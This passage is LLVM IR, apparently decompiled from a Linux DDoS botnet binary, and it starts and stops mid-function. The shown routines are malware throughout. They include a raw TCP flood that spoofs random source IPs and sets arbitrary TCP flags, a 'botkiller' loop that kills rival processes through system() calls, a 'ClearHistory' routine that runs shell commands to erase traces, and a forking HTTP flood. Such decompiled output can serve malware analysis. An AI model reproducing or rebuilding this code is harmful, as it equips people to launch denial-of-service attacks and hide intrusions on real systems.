  br i1 %v2_fc38, label %dec_label_pc_fc40, label %dec_label_pc_fc58

dec_label_pc_fc40:                                ; preds = %dec_label_pc_fc04
  %v2_fc44 = load i32, i32* @global_var_299a0.50, align 4
  %v3_fc50 = call i32 @sockprintf(i32 %v2_fc44, i32 ptrtoint ([27 x i8]* @global_var_1f770.557 to i32))
  br label %dec_label_pc_10240

dec_label_pc_fc58:                                ; preds = %dec_label_pc_fc04
  store i32 1, i32* %stack_var_-72, align 4
  %v2_fc60 = ptrtoint i32* %stack_var_-72 to i32
  store i32 3, i32* @r2, align 4
  %v5_fc7c = call i32 @__GI_setsockopt(i32 %v3_fc28, i32 0, i32 3, i32 %v2_fc60, i32 4)
  %v1_fc84 = icmp slt i32 %v5_fc7c, 0
  br i1 %v1_fc84, label %dec_label_pc_fc8c, label %dec_label_pc_fca4

dec_label_pc_fc8c:                                ; preds = %dec_label_pc_fc58
  %v2_fc90 = load i32, i32* @global_var_299a0.50, align 4
  %v3_fc9c = call i32 @sockprintf(i32 %v2_fc90, i32 ptrtoint ([33 x i8]* @global_var_1f78c.559 to i32))
  br label %dec_label_pc_10240

dec_label_pc_fca4:                                ; preds = %dec_label_pc_fc58
  %v2_fca8 = icmp eq i32 %arg4, 0
  br i1 %v2_fca8, label %dec_label_pc_fcd4, label %dec_label_pc_fcbc

dec_label_pc_fcbc:                                ; preds = %dec_label_pc_fca4
  %v1_fcc0 = sub i32 32, %arg4
  store i32 %v1_fcc0, i32* %r2.global-to-local, align 4
  %v1_fccc = shl i32 -1, %v1_fcc0
  br label %dec_label_pc_fcd4

dec_label_pc_fcd4:                                ; preds = %dec_label_pc_fca4, %dec_label_pc_fcbc
  %storemerge9 = phi i32 [ %v1_fccc, %dec_label_pc_fcbc ], [ 0, %dec_label_pc_fca4 ]
  %v1_fcd8 = add i32 %arg6, 40
  %v1_fce8 = add i32 %arg6, 54
  %v3_fcec = and i32 %v1_fce8, -8
  %v1_fcf4 = load i32, i32* @sp, align 4
  %v2_fcf4 = sub i32 %v1_fcf4, %v3_fcec
  %v1_fd04 = add i32 %v2_fcf4, 15
  %v3_fd08 = and i32 %v1_fd04, -8
  store i32 %v3_fd08, i32* %r2.global-to-local, align 4
  %v1_fd28 = add i32 %v3_fd08, 20
  %v5_fd2c = inttoptr i32 %v1_fd28 to i16*
  %v3_fd30 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_fd30, i32* @r4, align 4
  %v1_fd38 = call i32 @GetRandomIP(i32 %storemerge9)
  %v1_fd44 = call i32 @__GI_htonl(i32 %v1_fd38)
  store i32 %v1_fd44, i32* %r2.global-to-local, align 4
  %v1_fd50 = add i32 %arg6, 20
  %v1_fd54 = load i32, i32* @sp, align 4
  %v2_fd54 = inttoptr i32 %v1_fd54 to i32*
  store i32 %v1_fd50, i32* %v2_fd54, align 4
  %v0_fd5c = load i32, i32* @r4, align 4
  %v4_fd64 = inttoptr i32 %v3_fd08 to i8*
  %v5_fd64 = call i32 @makeIPPacket(i8* %v4_fd64, i32 %v0_fd5c, i32 %v1_fd44, i32 6)
  %v0_fd68 = call i32 @rand_cmwc()
  %v3_fd74 = urem i32 %v0_fd68, 65536
  store i32 %v3_fd74, i32* %r2.global-to-local, align 4
  %v1_fd7c = trunc i32 %v0_fd68 to i16
  store i16 %v1_fd7c, i16* %v5_fd2c, align 4
  %v0_fd80 = call i32 @rand_cmwc()
  %v2_fd8c = add i32 %v3_fd08, 24
  %v3_fd8c = inttoptr i32 %v2_fd8c to i32*
  store i32 %v0_fd80, i32* %v3_fd8c, align 8
  %v2_fd98 = add i32 %v3_fd08, 28
  %v3_fd98 = inttoptr i32 %v2_fd98 to i32*
  store i32 0, i32* %v3_fd98, align 4
  store i32 %v1_fd28, i32* %r2.global-to-local, align 4
  %v1_fda0 = add i32 %v3_fd08, 32
  %v2_fda0 = inttoptr i32 %v1_fda0 to i8*
  %v3_fda0 = load i8, i8* %v2_fda0, align 8
  %v1_fdac = urem i8 %v3_fda0, 16
  %v1_fdb0 = or i8 %v1_fdac, 80
  store i8 %v1_fdb0, i8* %v2_fda0, align 8
  %v3_fdc0 = load i32, i32* %stack_var_0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1f7b0.564 to i32), i32* @r1, align 4
  %v3_fdcc = inttoptr i32 %v3_fdc0 to i8*
  %v4_fdcc = call i32 @__GI_strcoll(i8* %v3_fdcc, i32 ptrtoint ([4 x i8]* @global_var_1f7b0.564 to i32))
  %v2_fdd4 = icmp eq i32 %v4_fdcc, 0
  br i1 %v2_fdd4, label %dec_label_pc_fddc, label %dec_label_pc_fe94

dec_label_pc_fddc:                                ; preds = %dec_label_pc_fcd4
  store i32 %v1_fd28, i32* %r2.global-to-local, align 4
  %v1_fde0 = add i32 %v3_fd08, 33
  %v2_fde0 = inttoptr i32 %v1_fde0 to i8*
  %v3_fde0 = load i8, i8* %v2_fde0, align 1
  %v1_fdf0 = or i8 %v3_fde0, 2
  store i8 %v1_fdf0, i8* %v2_fde0, align 1
  store i32 %v1_fd28, i32* %r2.global-to-local, align 4
  %v3_fe04 = load i8, i8* %v2_fde0, align 1
  %v1_fe14 = or i8 %v3_fe04, 4
  store i8 %v1_fe14, i8* %v2_fde0, align 1
  store i32 %v1_fd28, i32* %r2.global-to-local, align 4
  %v3_fe28 = load i8, i8* %v2_fde0, align 1
  %v1_fe38 = or i8 %v3_fe28, 1
  store i8 %v1_fe38, i8* %v2_fde0, align 1
  store i32 %v1_fd28, i32* %r2.global-to-local, align 4
  %v3_fe4c = load i8, i8* %v2_fde0, align 1
  %v1_fe5c = or i8 %v3_fe4c, 16
  store i8 %v1_fe5c, i8* %v2_fde0, align 1
  store i32 %v1_fd28, i32* %r2.global-to-local, align 4
  %v3_fe70 = load i8, i8* %v2_fde0, align 1
  %v1_fe80 = or i8 %v3_fe70, 8
  store i8 %v1_fe80, i8* %v2_fde0, align 1
  br label %dec_label_pc_1003c

dec_label_pc_fe94:                                ; preds = %dec_label_pc_fcd4
  %v3_fe94 = load i32, i32* %stack_var_0, align 4
  %v2_fea0 = call i32 @__GI_strtok(i32 %v3_fe94, i32 ptrtoint (i32* @global_var_1f7b4.566 to i32))
  %v2_1003418 = icmp eq i32 %v2_fea0, 0
  br i1 %v2_1003418, label %dec_label_pc_1003c, label %dec_label_pc_feb0.lr.ph

dec_label_pc_feb0.lr.ph:                          ; preds = %dec_label_pc_fe94
  %v1_fed0 = add i32 %v3_fd08, 33
  %v2_fed0 = inttoptr i32 %v1_fed0 to i8*
  br label %dec_label_pc_feb0

dec_label_pc_feb0:                                ; preds = %dec_label_pc_feb0.lr.ph, %dec_label_pc_1001c
  %storemerge1319 = phi i32 [ %v2_fea0, %dec_label_pc_feb0.lr.ph ], [ %v2_10024, %dec_label_pc_1001c ]
  store i32 ptrtoint ([4 x i8]* @global_var_1f7b8.568 to i32), i32* @r1, align 4
  %v3_febc = inttoptr i32 %storemerge1319 to i8*
  %v4_febc = call i32 @__GI_strcoll(i8* %v3_febc, i32 ptrtoint ([4 x i8]* @global_var_1f7b8.568 to i32))
  %v2_fec4 = icmp eq i32 %v4_febc, 0
  br i1 %v2_fec4, label %dec_label_pc_fecc, label %dec_label_pc_fef4

dec_label_pc_fecc:                                ; preds = %dec_label_pc_feb0
  %v3_fed0 = load i8, i8* %v2_fed0, align 1
  %v4_fed8 = zext i8 %v3_fed0 to i32
  %v1_fee0 = or i32 %v4_fed8, 2
  store i32 %v1_fee0, i32* %r2.global-to-local, align 4
  %v1_feec = trunc i32 %v1_fee0 to i8
  store i8 %v1_feec, i8* %v2_fed0, align 1
  br label %dec_label_pc_1001c

dec_label_pc_fef4:                                ; preds = %dec_label_pc_feb0
  store i32 ptrtoint ([4 x i8]* @global_var_1f7bc.570 to i32), i32* @r1, align 4
  %v4_ff00 = call i32 @__GI_strcoll(i8* %v3_febc, i32 ptrtoint ([4 x i8]* @global_var_1f7bc.570 to i32))
  %v2_ff08 = icmp eq i32 %v4_ff00, 0
  br i1 %v2_ff08, label %dec_label_pc_ff10, label %dec_label_pc_ff38

dec_label_pc_ff10:                                ; preds = %dec_label_pc_fef4
  %v3_ff14 = load i8, i8* %v2_fed0, align 1
  %v4_ff1c = zext i8 %v3_ff14 to i32
  %v1_ff24 = or i32 %v4_ff1c, 4
  store i32 %v1_ff24, i32* %r2.global-to-local, align 4
  %v1_ff30 = trunc i32 %v1_ff24 to i8
  store i8 %v1_ff30, i8* %v2_fed0, align 1
  br label %dec_label_pc_1001c

dec_label_pc_ff38:                                ; preds = %dec_label_pc_fef4
  store i32 ptrtoint ([4 x i8]* @global_var_1f7c0.572 to i32), i32* @r1, align 4
  %v4_ff44 = call i32 @__GI_strcoll(i8* %v3_febc, i32 ptrtoint ([4 x i8]* @global_var_1f7c0.572 to i32))
  %v2_ff4c = icmp eq i32 %v4_ff44, 0
  br i1 %v2_ff4c, label %dec_label_pc_ff54, label %dec_label_pc_ff7c

dec_label_pc_ff54:                                ; preds = %dec_label_pc_ff38
  %v3_ff58 = load i8, i8* %v2_fed0, align 1
  %v4_ff60 = zext i8 %v3_ff58 to i32
  %v1_ff68 = or i32 %v4_ff60, 1
  store i32 %v1_ff68, i32* %r2.global-to-local, align 4
  %v1_ff74 = trunc i32 %v1_ff68 to i8
  store i8 %v1_ff74, i8* %v2_fed0, align 1
  br label %dec_label_pc_1001c

dec_label_pc_ff7c:                                ; preds = %dec_label_pc_ff38
  store i32 ptrtoint ([4 x i8]* @global_var_1f7c4.574 to i32), i32* @r1, align 4
  %v4_ff88 = call i32 @__GI_strcoll(i8* %v3_febc, i32 ptrtoint ([4 x i8]* @global_var_1f7c4.574 to i32))
  %v2_ff90 = icmp eq i32 %v4_ff88, 0
  br i1 %v2_ff90, label %dec_label_pc_ff98, label %dec_label_pc_ffc0

dec_label_pc_ff98:                                ; preds = %dec_label_pc_ff7c
  %v3_ff9c = load i8, i8* %v2_fed0, align 1
  %v4_ffa4 = zext i8 %v3_ff9c to i32
  %v1_ffac = or i32 %v4_ffa4, 16
  store i32 %v1_ffac, i32* %r2.global-to-local, align 4
  %v1_ffb8 = trunc i32 %v1_ffac to i8
  store i8 %v1_ffb8, i8* %v2_fed0, align 1
  br label %dec_label_pc_1001c

dec_label_pc_ffc0:                                ; preds = %dec_label_pc_ff7c
  store i32 ptrtoint ([4 x i8]* @global_var_1f7c8.576 to i32), i32* @r1, align 4
  %v4_ffcc = call i32 @__GI_strcoll(i8* %v3_febc, i32 ptrtoint ([4 x i8]* @global_var_1f7c8.576 to i32))
  %v2_ffd4 = icmp eq i32 %v4_ffcc, 0
  br i1 %v2_ffd4, label %dec_label_pc_ffdc, label %dec_label_pc_10004

dec_label_pc_ffdc:                                ; preds = %dec_label_pc_ffc0
  %v3_ffe0 = load i8, i8* %v2_fed0, align 1
  %v4_ffe8 = zext i8 %v3_ffe0 to i32
  %v1_fff0 = or i32 %v4_ffe8, 8
  store i32 %v1_fff0, i32* %r2.global-to-local, align 4
  %v1_fffc = trunc i32 %v1_fff0 to i8
  store i8 %v1_fffc, i8* %v2_fed0, align 1
  br label %dec_label_pc_1001c

dec_label_pc_10004:                               ; preds = %dec_label_pc_ffc0
  %v2_10008 = load i32, i32* @global_var_299a0.50, align 4
  store i32 %storemerge1319, i32* @r2, align 4
  %v3_10018 = call i32 @sockprintf(i32 %v2_10008, i32 ptrtoint ([18 x i8]* @global_var_1f7cc.578 to i32))
  br label %dec_label_pc_1001c

dec_label_pc_1001c:                               ; preds = %dec_label_pc_ffdc, %dec_label_pc_ff98, %dec_label_pc_ff54, %dec_label_pc_ff10, %dec_label_pc_fecc, %dec_label_pc_10004
  %v2_10024 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1f7b4.566 to i32))
  %v2_10034 = icmp eq i32 %v2_10024, 0
  br i1 %v2_10034, label %dec_label_pc_1003c, label %dec_label_pc_feb0

dec_label_pc_1003c:                               ; preds = %dec_label_pc_1001c, %dec_label_pc_fe94, %dec_label_pc_fddc
  %v0_1003c = call i32 @rand_cmwc()
  %v1_10050 = trunc i32 %v0_1003c to i16
  %v3_10050 = add i32 %v3_fd08, 34
  %v4_10050 = inttoptr i32 %v3_10050 to i16*
  store i16 %v1_10050, i16* %v4_10050, align 2
  %v3_1005c = add i32 %v3_fd08, 36
  %v4_1005c = inttoptr i32 %v3_1005c to i16*
  store i16 0, i16* %v4_1005c, align 4
  store i32 %v1_fd28, i32* %r2.global-to-local, align 4
  %v3_10068 = add i32 %v3_fd08, 38
  %v4_10068 = inttoptr i32 %v3_10068 to i16*
  store i16 0, i16* %v4_10068, align 2
  br i1 %v2_fba4, label %dec_label_pc_10078, label %dec_label_pc_10090

dec_label_pc_10078:                               ; preds = %dec_label_pc_1003c
  %v0_10078 = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_10078 to i16
  br label %dec_label_pc_100ac

dec_label_pc_10090:                               ; preds = %dec_label_pc_1003c
  %v3_10098 = urem i32 %arg2, 65536
  %v1_100a0 = call i32 @__GI_htons(i32 %v3_10098)
  %extract.t72 = trunc i32 %v1_100a0 to i16
  br label %dec_label_pc_100ac

dec_label_pc_100ac:                               ; preds = %dec_label_pc_10078, %dec_label_pc_10090
  %v0_10078.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10078 ], [ %extract.t72, %dec_label_pc_10090 ]
  %v3_100b4 = add i32 %v3_fd08, 22
  %v4_100b4 = inttoptr i32 %v3_100b4 to i16*
  store i16 %v0_10078.sink.off0, i16* %v4_100b4, align 2
  %v2_100c0 = call i32 @tcpcsum(i32 %v3_fd08, i32 %v1_fd28)
  %v1_100d0 = trunc i32 %v2_100c0 to i16
  store i16 %v1_100d0, i16* %v4_1005c, align 4
  store i32 %v3_fd08, i32* %r2.global-to-local, align 4
  %v1_100e0 = or i32 %v3_fd08, 2
  %v2_100e0 = inttoptr i32 %v1_100e0 to i16*
  %v3_100e0 = load i16, i16* %v2_100e0, align 2
  %v4_100e0 = zext i16 %v3_100e0 to i32
  %v2_100ec = inttoptr i32 %v3_fd08 to i16*
  %v3_100ec = call i32 @csum(i16* %v2_100ec, i32 %v4_100e0)
  %sext3 = mul i32 %v3_100ec, 65536
  %v1_100f0 = sdiv i32 %sext3, 65536
  store i32 %v1_100f0, i32* %r2.global-to-local, align 4
  %v1_100fc = trunc i32 %v1_100f0 to i16
  %v3_100fc = add i32 %v3_fd08, 10
  %v4_100fc = inttoptr i32 %v3_100fc to i16*
  store i16 %v1_100fc, i16* %v4_100fc, align 2
  %v2_10104 = call i32 @__GI_time(i32* null)
  %v2_10110 = add i32 %v2_10104, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_10124 = ptrtoint i32* %stack_var_-68 to i32
  %v2_10164 = add i32 %v3_fd08, 12
  %v3_10164 = inttoptr i32 %v2_10164 to i32*
  %v3_1017c = or i32 %v3_fd08, 4
  %v4_1017c = inttoptr i32 %v3_1017c to i16*
  br label %dec_label_pc_10120

dec_label_pc_10120:                               ; preds = %dec_label_pc_10230, %dec_label_pc_10224, %dec_label_pc_100ac
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_100ac ], [ 0, %dec_label_pc_10224 ], [ %v1_10234, %dec_label_pc_10230 ]
  store i32 %v3_fd08, i32* %r2.global-to-local, align 4
  %v1_10128 = load i32, i32* @sp, align 4
  %v2_10128 = inttoptr i32 %v1_10128 to i32*
  store i32 %v2_10124, i32* %v2_10128, align 4
  %v1_10130 = load i32, i32* @sp, align 4
  %v2_10130 = add i32 %v1_10130, 4
  %v3_10130 = inttoptr i32 %v2_10130 to i32*
  store i32 16, i32* %v3_10130, align 4
  %v0_10138 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_fcd8, i32* %r2.global-to-local, align 4
  %v6_10144 = call i32 @__libc_sendto(i32 %v3_fc28, i32 %v0_10138, i32 %v1_fcd8, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_1014c = call i32 @GetRandomIP(i32 %storemerge9)
  %v1_10158 = call i32 @__GI_htonl(i32 %v1_1014c)
  store i32 %v1_10158, i32* %r2.global-to-local, align 4
  store i32 %v1_10158, i32* %v3_10164, align 4
  %v0_10168 = call i32 @rand_cmwc()
  %v3_10174 = urem i32 %v0_10168, 65536
  store i32 %v3_10174, i32* %r2.global-to-local, align 4
  %v1_1017c = trunc i32 %v0_10168 to i16
  store i16 %v1_1017c, i16* %v4_1017c, align 4
  %v0_10180 = call i32 @rand_cmwc()
  store i32 %v0_10180, i32* %r2.global-to-local, align 4
  store i32 %v0_10180, i32* %v3_fd8c, align 8
  %v0_10190 = call i32 @rand_cmwc()
  %v1_101a4 = trunc i32 %v0_10190 to i16
  store i16 %v1_101a4, i16* %v5_fd2c, align 4
  store i32 %v1_fd28, i32* %r2.global-to-local, align 4
  store i16 0, i16* %v4_1005c, align 4
  %v4_101bc = call i32 @tcpcsum(i32 %v3_fd08, i32 %v1_fd28)
  %v1_101cc = trunc i32 %v4_101bc to i16
  store i16 %v1_101cc, i16* %v4_1005c, align 4
  store i32 %v3_fd08, i32* %r2.global-to-local, align 4
  %v3_101dc = load i16, i16* %v2_100e0, align 2
  %v4_101dc = zext i16 %v3_101dc to i32
  %v3_101e8 = call i32 @csum(i16* %v2_100ec, i32 %v4_101dc)
  %sext5 = mul i32 %v3_101e8, 65536
  %v1_101ec = sdiv i32 %sext5, 65536
  store i32 %v1_101ec, i32* %r2.global-to-local, align 4
  %v1_101f8 = trunc i32 %v1_101ec to i16
  store i16 %v1_101f8, i16* %v4_100fc, align 2
  %v9_10204 = icmp eq i32 %stack_var_-92.0, %arg7
  br i1 %v9_10204, label %dec_label_pc_1020c, label %dec_label_pc_10230

dec_label_pc_1020c:                               ; preds = %dec_label_pc_10120
  %v2_10210 = call i32 @__GI_time(i32* null)
  store i32 %v2_10210, i32* %r2.global-to-local, align 4
  %v8_10220 = icmp sgt i32 %v2_10210, %v2_10110
  br i1 %v8_10220, label %dec_label_pc_10240, label %dec_label_pc_10224

dec_label_pc_10224:                               ; preds = %dec_label_pc_1020c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10120

dec_label_pc_10230:                               ; preds = %dec_label_pc_10120
  %v1_10234 = add i32 %stack_var_-92.0, 1
  br label %dec_label_pc_10120

dec_label_pc_10240:                               ; preds = %dec_label_pc_1020c, %dec_label_pc_fbe0, %dec_label_pc_fc8c, %dec_label_pc_fc40
  %v1_1024c = phi i32 [ %v3_fbf0, %dec_label_pc_fbe0 ], [ %v3_fc9c, %dec_label_pc_fc8c ], [ %v3_fc50, %dec_label_pc_fc40 ], [ %v2_10210, %dec_label_pc_1020c ]
  ret i32 %v1_1024c

; uselistorder directives
  uselistorder i32 %v1_101ec, { 1, 0 }
  uselistorder i32 %v0_10168, { 1, 0 }
  uselistorder i32 %v1_100f0, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i8* %v2_fed0, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i8* %v2_fde0, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v0_fd68, { 1, 0 }
  uselistorder i32 %v1_fd28, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10 }
  uselistorder i32 %v3_fd08, { 9, 8, 6, 19, 7, 5, 21, 18, 4, 3, 17, 16, 15, 14, 13, 20, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_fcd8, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @__GI_htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10240, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_100ac, { 1, 0 }
  uselistorder label %dec_label_pc_1001c, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_feb0, { 1, 0 }
  uselistorder label %dec_label_pc_fcd4, { 1, 0 }
  uselistorder label %dec_label_pc_fbe0, { 1, 0 }
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_1027c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_1027c, i32* @ip, align 4
  %v2_10298 = ptrtoint i32* %stack_var_-100 to i32
  %v2_102c4 = bitcast i32* %stack_var_-100 to i8*
  br label %dec_label_pc_1028c

dec_label_pc_1028c:                               ; preds = %dec_label_pc_10338, %entry
  br label %dec_label_pc_10298

dec_label_pc_10298:                               ; preds = %dec_label_pc_1028c, %dec_label_pc_10298
  %storemerge12 = phi i32 [ 0, %dec_label_pc_1028c ], [ %v1_10324, %dec_label_pc_10298 ]
  store i32 %v2_10298, i32* @r3, align 4
  store i32 %v2_10298, i32* @r0, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_1f7e0.580 to i32), i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_102a8 = call i32 @memcpy()
  %v4_102b4 = mul nuw nsw i32 %storemerge12, 4
  %v5_102b4 = add i32 %v4_102b4, ptrtoint ([87 x i8*]* @global_var_294fc.665 to i32)
  %v6_102b4 = inttoptr i32 %v5_102b4 to i32*
  %v7_102b4 = load i32, i32* %v6_102b4, align 4
  store i32 %v7_102b4, i32* @r1, align 4
  %v3_102c4 = call i32 @strcat(i8* %v2_102c4, i32 %v7_102b4)
  %v1_102d0 = call i32 @__libc_system(i32 %v2_10298)
  store i32 %v2_10298, i32* @r3, align 4
  store i32 %v2_10298, i32* @r0, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1f7ec.667 to i32), i32* @r1, align 4
  store i32 11, i32* @r2, align 4
  %v0_102e4 = call i32 @memcpy()
  %v7_102f0 = load i32, i32* %v6_102b4, align 4
  store i32 %v7_102f0, i32* @r1, align 4
  %v3_10300 = call i32 @strcat(i8* %v2_102c4, i32 %v7_102f0)
  store i32 ptrtoint (i32* @global_var_1f7f8.669 to i32), i32* @r1, align 4
  %v3_10310 = call i32 @strcat(i8* %v2_102c4, i32 ptrtoint (i32* @global_var_1f7f8.669 to i32))
  %v1_1031c = call i32 @__libc_system(i32 %v2_10298)
  %v1_10324 = add nuw nsw i32 %storemerge12, 1
  %v7_10334 = icmp slt i32 %v1_10324, 9
  br i1 %v7_10334, label %dec_label_pc_10298, label %dec_label_pc_10338

dec_label_pc_10338:                               ; preds = %dec_label_pc_10298
  %v1_1033c = call i32 @sleep(i32 5)
  br label %dec_label_pc_1028c

; uselistorder directives
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 51, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 50, { 0, 2, 1 }
  uselistorder i32 49, { 0, 2, 1 }
  uselistorder [3 x i8]* @global_var_1e158.36, { 1, 0 }
  uselistorder label %dec_label_pc_10298, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %v2_10364 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_1f7fc.671 to i32))
  %v2_1036c = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_1f814.673 to i32))
  %v2_10374 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_1f834.675 to i32))
  ret i32 %v2_10374

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 4, 3, 2, 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-588 = alloca i32, align 4
  %stack_var_-48 = alloca i8**, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 66460, i32* %stack_var_-4, align 4
  %v2_10398 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10398, i32* @fp, align 4
  %v2_103b4 = ptrtoint i32* %stack_var_-24 to i32
  %v21_103cc = ptrtoint i8*** %stack_var_-48 to i32
  store i32 %v21_103cc, i32* @lr, align 4
  store i8** bitcast ([32 x i8]* @global_var_1f9bc.681 to i8**), i8*** %stack_var_-48, align 4
  %v2_103ec = call i32 @__GI_time(i32* null)
  %v3_103f4 = load i32, i32* %stack_var_0, align 4
  %v2_103f8 = add i32 %v3_103f4, %v2_103ec
  %v0_10400 = call i32 @rand()
  %v2_10414 = srem i32 %v0_10400, 3
  %v3_1043c = mul nsw i32 %v2_10414, 4
  %v2_10444 = add i32 %v2_103b4, -52
  %v2_10448 = add i32 %v2_10444, %v3_1043c
  %v1_1044c = inttoptr i32 %v2_10448 to i32*
  %v2_1044c = load i32, i32* %v1_1044c, align 4
  store i32 %v2_1044c, i32* @r4, align 4
  %v0_10450 = call i32 @rand()
  %v2_10484 = mul i32 %v0_10450, -6
  %v3_10494 = mul i32 %v0_10450, -24
  %v2_1049c = add i32 %v2_103b4, -40
  %v2_104a0 = add i32 %v2_1049c, %v3_10494
  %v1_104a4 = inttoptr i32 %v2_104a0 to i32*
  %v2_104a4 = load i32, i32* %v1_104a4, align 4
  %v2_104a8 = ptrtoint i32* %stack_var_-588 to i32
  %v0_104ac = load i32, i32* @r4, align 4
  store i32 %v2_104a8, i32* @r0, align 4
  %v8_104c4 = call i32 @sprintf(i32 %v2_104a8, i32 ptrtoint ([62 x i8]* @global_var_1fa68.701 to i32), i32 %arg2, i32 %arg4, i32 %v0_104ac, i32 %v2_104a4, i32 %v2_10484)
  store i32 %v8_104c4, i32* @r0, align 4
  %tmp36 = bitcast i32* %stack_var_-588 to i8*
  %v5_1057c43 = icmp sgt i32 %arg6, 0
  br i1 %v5_1057c43, label %dec_label_pc_104d4, label %dec_label_pc_10580

dec_label_pc_104d4:                               ; preds = %entry, %dec_label_pc_10564
  %storemerge144 = phi i32 [ %v1_10568, %dec_label_pc_10564 ], [ 0, %entry ]
  %v0_104d4 = call i32 @__libc_fork()
  store i32 %v0_104d4, i32* @r0, align 4
  %v2_104dc = icmp eq i32 %v0_104d4, 0
  br i1 %v2_104dc, label %dec_label_pc_10564, label %dec_label_pc_10544

dec_label_pc_104e8:                               ; preds = %dec_label_pc_10544
  %v4_10504 = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v2_10514 = icmp eq i32 %v4_10504, 0
  br i1 %v2_10514, label %dec_label_pc_10544, label %dec_label_pc_1051c

dec_label_pc_1051c:                               ; preds = %dec_label_pc_104e8
  %v3_10524 = call i32 @strlen(i8* %tmp36)
  %v2_10538 = call i32 @__GI_write(i32 %v4_10504, i32 %v2_104a8)
  %v1_10540 = call i32 @__GI_close(i32 %v4_10504)
  br label %dec_label_pc_10544

dec_label_pc_10544:                               ; preds = %dec_label_pc_104e8, %dec_label_pc_1051c, %dec_label_pc_104d4
  %v2_10548 = call i32 @__GI_time(i32* null)
  %v5_10558 = icmp slt i32 %v2_10548, %v2_103f8
  br i1 %v5_10558, label %dec_label_pc_104e8, label %dec_label_pc_1055c

dec_label_pc_1055c:                               ; preds = %dec_label_pc_10544
  %v1_10560 = call i32 @__GI__exit(i32 1)
  store i32 %v1_10560, i32* @r0, align 4
  br label %dec_label_pc_10564

dec_label_pc_10564:                               ; preds = %dec_label_pc_104d4, %dec_label_pc_1055c
  %v1_105883 = phi i32 [ 0, %dec_label_pc_104d4 ], [ %v1_10560, %dec_label_pc_1055c ]
  %v1_10568 = add nuw nsw i32 %storemerge144, 1
  %v5_1057c = icmp slt i32 %v1_10568, %arg6
  br i1 %v5_1057c, label %dec_label_pc_104d4, label %dec_label_pc_10580

dec_label_pc_10580:                               ; preds = %dec_label_pc_10564, %entry
  %v1_10588.lcssa = phi i32 [ %v8_104c4, %entry ], [ %v1_105883, %dec_label_pc_10564 ]
  ret i32 %v1_10588.lcssa

; uselistorder directives
  uselistorder i32 %v1_10568, { 1, 0 }
  uselistorder i32 %v4_10504, { 1, 0, 2 }
  uselistorder i32 %v2_104a8, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8*** %stack_var_-48, { 1, 0 }
  uselistorder i32 ()* @rand, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_10564, { 1, 0 }
  uselistorder label %dec_label_pc_10544, { 1, 0, 2 }
  uselistorder label %dec_label_pc_104d4, { 1, 0 }
}

define i32 @function_10594(i32 %arg1) local_unnamed_addr {
dec_label_pc_10594:
  %v0_10594 = load i1, i1* @cpsr_n, align 1
